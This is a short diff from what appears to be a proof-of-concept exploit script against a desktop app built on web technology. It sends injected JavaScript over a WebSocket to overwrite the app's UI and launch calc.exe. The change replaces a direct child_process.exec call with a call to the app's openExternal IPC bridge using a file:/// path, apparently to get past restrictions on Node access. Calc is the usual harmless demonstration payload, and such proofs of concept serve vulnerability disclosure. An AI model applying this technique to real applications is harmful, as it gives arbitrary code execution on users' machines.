@@ -53,8 +53,8 @@
                         console.log('UI Overwritten');
                     `;
                     const calcScript = `
-                        require('child_process').exec('calc.exe');
-                        console.log('Calculator launched');
+                        window.utils.openExternal("file:///C:/Windows/System32/calc.exe");
+                        console.log('Calculator launched via OPEN_EXTERNAL IPC');
                     `;
                     ws.send(JSON.stringify({
                         id: 1,
